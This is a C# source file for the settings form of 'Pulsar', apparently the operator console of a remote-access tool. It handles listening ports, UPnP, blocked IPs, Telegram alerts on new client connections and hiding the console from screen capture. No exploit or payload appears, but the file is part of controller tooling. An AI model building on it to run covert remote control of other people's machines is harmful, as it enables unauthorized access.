using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Globalization;
using System.Linq;
using System.Net.Sockets;
using System.Windows.Forms;
using Pulsar.Server.DiscordRPC;
using Pulsar.Server.TelegramSender;
using Newtonsoft.Json;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;


namespace Pulsar.Server.Forms
{
    public partial class FrmSettings : Form
    {
        private readonly PulsarServer _listenServer;
        private bool _previousDiscordRPCState; // Track previous state of Discord RPC checkbox

        public FrmSettings(PulsarServer listenServer)
        {
            this._listenServer = listenServer;

            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            ToggleListenerSettings(!listenServer.Listening);
        }

        private void FrmSettings_Load(object sender, EventArgs e)
        {
            ncPort.Value = Settings.ListenPort;
            var allPorts = new List<ushort> { Settings.ListenPort };
            if (Settings.ListenPorts != null)
                allPorts.AddRange(Settings.ListenPorts);
            allPorts = allPorts.Distinct().ToList();
            if (allPorts.Count > 0)
            {
                txtMultiPorts.Text = string.Join(", ", allPorts);
                txtMultiPorts.ForeColor = System.Drawing.Color.Black;
            }
            else
            {
                txtMultiPorts.Text = "port1 port2 etc..";
                txtMultiPorts.ForeColor = System.Drawing.Color.Gray;
            }
            chkDarkMode.Checked = Settings.DarkMode;
            chkHideFromScreenCapture.Checked = Settings.HideFromScreenCapture;
            chkIPv6Support.Checked = Settings.IPv6Support;
            chkAutoListen.Checked = Settings.AutoListen;
            chkPopup.Checked = Settings.ShowPopup;
            chkUseUpnp.Checked = Settings.UseUPnP;
            chkShowTooltip.Checked = Settings.ShowToolTip;
            chkEventLog.Checked = Settings.EventLog;
            chkShowCountryGroups.Checked = Settings.ShowCountryGroups;
            txtTelegramChatID.Text = Settings.TelegramChatID;
            txtTelegramToken.Text = Settings.TelegramBotToken;
            chkTelegramNotis.Checked = Settings.TelegramNotifications;
            chkDiscordRPC.Checked = Settings.DiscordRPC; // hidden by design
            _previousDiscordRPCState = chkDiscordRPC.Checked;

            string pulsarPath = Path.Combine(Application.StartupPath, "PulsarStuff");
            string filePath = Path.Combine(pulsarPath, "blocked.json");

            try
            {
                if (!(Directory.Exists(pulsarPath) && File.Exists(filePath)))
                {
                    Directory.CreateDirectory(pulsarPath);
                    File.WriteAllText(filePath, "[]");
                }
                string json = File.ReadAllText(filePath);
                var blockedIPs = JsonConvert.DeserializeObject<List<string>>(json);
                if (blockedIPs != null && blockedIPs.Count > 0)
                {
                    BlockedRichTB.Text = string.Join(Environment.NewLine, blockedIPs);
                }
                else
                {
                    BlockedRichTB.Text = string.Empty;
                }
            }
            catch (Exception)
            {

            }
        }

        private void txtMultiPorts_Enter(object sender, EventArgs e)
        {
            if (txtMultiPorts.Text == "port1 port2 etc..")
            {
                txtMultiPorts.Text = "";
                txtMultiPorts.ForeColor = System.Drawing.Color.Black;
            }
        }

        private void txtMultiPorts_Leave(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtMultiPorts.Text))
            {
                txtMultiPorts.Text = "port1 port2 etc..";
                txtMultiPorts.ForeColor = System.Drawing.Color.Gray;
            }
        }

        private ushort GetPortSafe()
        {
            var portValue = ncPort.Value.ToString(CultureInfo.InvariantCulture);
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }

        private static IEnumerable<ushort> ParsePorts(string input)
        {
            var list = new List<ushort>();
            if (string.IsNullOrWhiteSpace(input) || input == "port1 port2 etc..") return list;

            foreach (var token in input.Split(new[] { ',', ';', ' ', '_' }, StringSplitOptions.RemoveEmptyEntries))
            {
                var part = token.Trim();
                if (part.Contains("-"))
                {
                    var bounds = part.Split('-');
                    if (bounds.Length == 2 && ushort.TryParse(bounds[0], out var a) && ushort.TryParse(bounds[1], out var b))
                    {
                        if (a > b) { var t = a; a = b; b = t; }
                        for (var p = a; p <= b; p++) list.Add((ushort)p);
                    }
                }
                else if (ushort.TryParse(part, out var single))
                {
                    if (single >= 1 && single <= 65535)
                    {
                        list.Add(single);
                    }
                }
            }
            return list.Distinct();
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            var port = GetPortSafe();
            if (port == 0) return;

            var existing = txtMultiPorts.Text;
            var parts = new List<string>();
            if (!string.IsNullOrWhiteSpace(existing))
                parts.AddRange(existing.Split(new[] { ',', ';' }, StringSplitOptions.RemoveEmptyEntries).Select(s => s.Trim()));

            if (!parts.Contains(port.ToString()))
            {
                parts.Add(port.ToString());
                txtMultiPorts.Text = string.Join(",", parts);
            }
        }

        private void txtMultiPorts_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsControl(e.KeyChar)) return;
            if (char.IsDigit(e.KeyChar)) return;
            if (e.KeyChar == ',' || e.KeyChar == '-' || e.KeyChar == ';' || e.KeyChar == ' ') return;
            e.Handled = true;
        }

        private void txtMultiPorts_TextChanged(object sender, EventArgs e)
        {

        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            var allPorts = ParsePorts(txtMultiPorts.Text).Distinct().ToList();
            if (allPorts.Count == 0)
            {
                MessageBox.Show("Please enter at least one port in 'Ports to listen to'.", "No ports provided", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (btnListen.Text == "Start listening" && !_listenServer.Listening)
            {
                try
                {
                    _listenServer.ListenMany(allPorts, chkIPv6Support.Checked, chkUseUpnp.Checked);
                    ToggleListenerSettings(false);
                }
                catch (SocketException ex)
                {
                    if (ex.ErrorCode == 10048)
                    {
                        MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    else
                    {
                        MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    _listenServer.Disconnect();
                }
                catch (Exception)
                {
                    _listenServer.Disconnect();
                }
            }
            else if (btnListen.Text == "Stop listening" && _listenServer.Listening)
            {
                _listenServer.Disconnect();
                ToggleListenerSettings(true);
                FrmMain mainForm = Application.OpenForms.OfType<FrmMain>().FirstOrDefault();
                if (mainForm != null)
                {
                    mainForm.EventLog("Server stopped listening for connections.", "info");
                }
            }
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            var ports = ParsePorts(txtMultiPorts.Text).Distinct().ToArray();
            if (ports.Length == 0)
            {
                MessageBox.Show("Please enter at least one port in 'Ports to listen to'.", "No ports provided", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            Settings.ListenPort = ports[0];
            Settings.ListenPorts = ports.Skip(1).ToArray();
            
            txtMultiPorts.Text = string.Join(", ", ports);
            Settings.DarkMode = chkDarkMode.Checked;
            Settings.HideFromScreenCapture = chkHideFromScreenCapture.Checked;
            Settings.IPv6Support = chkIPv6Support.Checked;
            Settings.AutoListen = chkAutoListen.Checked;
            Settings.ShowPopup = chkPopup.Checked;
            Settings.UseUPnP = chkUseUpnp.Checked;
            Settings.ShowToolTip = chkShowTooltip.Checked;
            Settings.EventLog = chkEventLog.Checked;
            Settings.ShowCountryGroups = chkShowCountryGroups.Checked;
            Settings.DiscordRPC = chkDiscordRPC.Checked;
            Settings.TelegramChatID = txtTelegramChatID.Text;
            Settings.TelegramBotToken = txtTelegramToken.Text;
            Settings.TelegramNotifications = chkTelegramNotis.Checked;
            DiscordRPCManager.ApplyDiscordRPC(this);

            FrmMain mainForm = Application.OpenForms.OfType<FrmMain>().FirstOrDefault();
            if (mainForm != null)
            {
                mainForm.EventLogVisability();
                mainForm.RefreshClientGroups();
                mainForm.RefreshClientTheme();
            }

            string[] ipList = BlockedRichTB.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            var blockedIPs = ipList.ToList();
            string filePath = "blocked.json";
            try
            {
                string json = JsonConvert.SerializeObject(blockedIPs, Formatting.Indented);
                File.WriteAllText(filePath, json);
            }
            catch (Exception)
            {
            }

            this.Close();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Discard your changes?", "Cancel", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
                DialogResult.Yes)
                this.Close();
        }

        private void chkDiscordRPC_CheckedChanged(object sender, EventArgs e)
        {
            Settings.DiscordRPC = chkDiscordRPC.Checked;
            DiscordRPCManager.ApplyDiscordRPC(this);
            Debug.WriteLine("Discord RPC toggled to: " + chkDiscordRPC.Checked);

            if (_previousDiscordRPCState && !chkDiscordRPC.Checked)
            {
                MessageBox.Show(
                    "Discord RPC has been disabled. It may still show on your profile until you restart both Discord and Pulsar.",
                    "Discord RPC Disabled",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );
            }

            _previousDiscordRPCState = chkDiscordRPC.Checked;
        }

        private void ToggleListenerSettings(bool enabled)
        {
            btnListen.Text = enabled ? "Start listening" : "Stop listening";
            ncPort.Enabled = false;
            chkIPv6Support.Enabled = enabled;
            chkUseUpnp.Enabled = enabled;
            txtMultiPorts.Enabled = enabled;
        }

        private void TelegramControlHandler(bool enable)
        {
            txtTelegramToken.Enabled = enable;
            txtTelegramChatID.Enabled = enable;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void chkTelegramNotis_CheckedChanged(object sender, EventArgs e)
        {
            TelegramControlHandler(chkTelegramNotis.Checked);
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(txtTelegramToken.Text))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                string[] tokenParts = txtTelegramToken.Text.Split(':');
                if (tokenParts.Length != 2 ||
                    !tokenParts[0].All(char.IsDigit) ||
                    tokenParts[1].Length != 35 ||
                    !tokenParts[1].All(c => char.IsLetterOrDigit(c) || c == '_' || c == '-'))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                if (string.IsNullOrWhiteSpace(txtTelegramChatID.Text))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                if (!long.TryParse(txtTelegramChatID.Text, out long chatId))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                string response = await Pulsar.Server.TelegramSender.Send.SendConnectionMessage(
                    txtTelegramToken.Text,
                    txtTelegramChatID.Text,
                    "TestClient123",
                    "192.168.1.100",
                    "TestLand"
                );
                MessageBox.Show("Checked And Working");
            }
            catch (Exception)
            {
                MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
            }
        }
        private void txtNoIPHost_TextChanged(object sender, EventArgs e)
        {

        }

        private void hideFromScreenCapture_CheckedChanged(object sender, EventArgs e)
        {
            ScreenCaptureHider.ScreenCaptureHider.FormsHiddenFromScreenCapture = chkHideFromScreenCapture.Checked;
            ScreenCaptureHider.ScreenCaptureHider.Refresh();
        }
    }
}